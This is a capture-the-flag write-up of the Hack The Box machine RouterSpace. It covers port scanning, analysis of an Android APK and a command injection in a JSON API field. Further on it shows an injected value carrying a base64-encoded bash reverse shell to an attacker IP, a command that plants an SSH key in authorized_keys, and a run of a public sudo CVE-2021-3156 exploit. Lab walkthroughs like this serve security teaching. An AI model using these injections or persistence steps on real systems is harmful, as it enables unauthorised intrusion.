> Author: **[h4rithd][author-profile]**

## Discovery

### Port scanning

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey:
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-RouterSpace Packet Filtering V1
80/tcp open  http
|_http-title: RouterSpace
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 90111FE0ED228B462CB308F74498A997
|_http-trane-info: Problem with XML parsing of /evox/about
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-1944
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 69
|     ETag: W/"45-BMdB+51AodoGDFk+wHWC8a2zpFs"
|     Date: Mon, 09 May 2022 18:42:36 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: Ru Rt0 t q }
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-78875
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Mon, 09 May 2022 18:42:35 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-23514
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Mon, 09 May 2022 18:42:35 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
```

### Web browsing

The website is mostly empty except for a download:

![][frontpage]

## The APK

### Static analysis

The APK can be unpacked with:

```shell
jadx-gui  sources/router.apk &
```

The main activity & application classes are empty.

Manually browsing the string & XML resources returned nothing.

And grepping for URLs and IPs failed too.

The debugging flag is set to `False` in the manifest. It can be bypassed, but
let's look at the running app first.

### Dynamic analysis

To get a feel of the app, I installed it on a Genymotion VM:

```shell
adb install sources/router.apk
```

It looks like a VPN for Android:

![][android-app]

Genymotion natively supports proxy: it can route the request to BurpSuite.

```
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
accept: application/json, text/plain, */*
user-agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 16
Host: routerspace.htb
Connection: close
Accept-Encoding: gzip, deflate

{"ip":"0.0.0.0"}
```

And the response echoes the request data back!

## Echown

Obviously we want the server to echo a reverse shell back:

```json
{"ip":"heyhey;echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMi85OTk5ICAwPiYx | base64 -d | bash"}
```

Or may-be not... This does not work and the port 22 is open: let's get the ssh key.

```shell
id
# uid=1001(paul) gid=1001(paul) groups=1001(paul)
pwd
# opt/www/public/routerspace
ls -lah
# total 80K
# drwxr-xr-x  4 root root 4.0K Feb 16 13:42 .
# drwxr-xr-x  3 root root 4.0K Feb 17 17:12 ..
# -rwxr-xr-x  1 root root 7.6K Feb 16 13:38 index.js
# drwxr-xr-x 87 root root 4.0K Feb 17 18:30 node_modules
# -rwxr-xr-x  1 root root  426 Nov 17 06:46 package.json
# -rwxr-xr-x  1 root root  52K Nov 17 06:46 package-lock.json
# drwxr-xr-x  7 root root 4.0K Feb 17 18:30 static
ls -lah /home/paul
# drwxr-xr-x 8 paul paul 4.0K Feb 17 18:30 .
# drwxr-xr-x 3 root root 4.0K Feb 17 18:30 ..
# lrwxrwxrwx 1 root root    9 Nov 20 19:32 .bash_history -> /dev/null
# -rw-r--r-- 1 paul paul  220 Nov 20 17:32 .bash_logout
# -rw-r--r-- 1 paul paul 3.7K Nov 20 17:32 .bashrc
# drwx------ 2 paul paul 4.0K Feb 17 18:30 .cache
# drwx------ 2 paul paul 4.0K Feb 17 18:30 .gnupg
# drwxrwxr-x 3 paul paul 4.0K Feb 17 18:30 .local
# drwxrwxr-x 5 paul paul 4.0K May  9 13:21 .pm2
# -rw-r--r-- 1 paul paul  823 Nov 20 18:30 .profile
# drwxr-xr-x 3 paul paul 4.0K Feb 17 18:30 snap
# drwx------ 2 paul paul 4.0K Feb 17 18:30 .ssh
# -r--r----- 1 root paul   33 May  9 13:21 user.txt
ls -lah /home/paul/.ssh
# drwx------ 2 paul paul 4.0K Feb 17 18:30 .
# drwxr-xr-x 8 paul paul 4.0K Feb 17 18:30 ..
echo -n c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDMW1vYWxtRG56Y1I0Snc5Y0tPWlo2TG1DN0cvL20rRC85STE4bHVVN0IrRTVmTFdVWDJObnNyOCtZUVpLdnlwb0ZJQnB6K1drSXdEeFJ5TklZMmVSbW1JOERiVDdVdEJoYjI0T0xGbVh2Q0Zidkp6LzJNM3JJVXB0eE1raVkzZ2NHNUVoZ095QVZyWVk5YVI2S0tOVENLZjROZXA2WGRCUEVrNzgxTVhtWkkvc0I0Rzd6bmpJWkJCeno1ak5mb1M1Zzl5SkhiRHZGZWhTK0V4SjVLUUlTbUt4ei8zc1p4a2FUUXJ5Y3lJRFlBWGRTNWY2Zk5aVE1JQ0R6QUl2empseFhpYXdKSVl0NW1QZzA1TE85RlJDWDFQMG1mSWhPZWdQcUoyalgxci9vcG15cXRWVnZOdEJQLzdKdVUwT1BwQWEyeVNxZHJOeGFjUWl3d0lzSHU5TlIK | base64 -d > /home/paul/.ssh/authorized_keys
```

## Privesc

When logging on SSH, the MOTD tells us the box is out of date:

```
80 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable
```

This is a clear pointer:

```shell
apt list --upgradable 
# sudo/focal-updates,focal-security 1.8.31-1ubuntu1.2 amd64 [upgradable from: 1.8.31-1ubuntu1]
sudo --version
# Sudo version 1.8.31
```

`sudo` is out of date!

Let's try the CVE-2021-3156 with the exploit from [worawit][cve-2021-3156]:

```shell
scp -i credentials/id_rsa.paul cve.py paul@10.10.11.148:cve.py
python3 cve.py
```

It works!!

[author-profile]: https://app.hackthebox.com/users/550483
[android-app]: images/screenshot-android-app.png
[cve-2021-3156]: https://github.com/worawit/CVE-2021-3156
[frontpage]: images/screenshot-frontpage.png
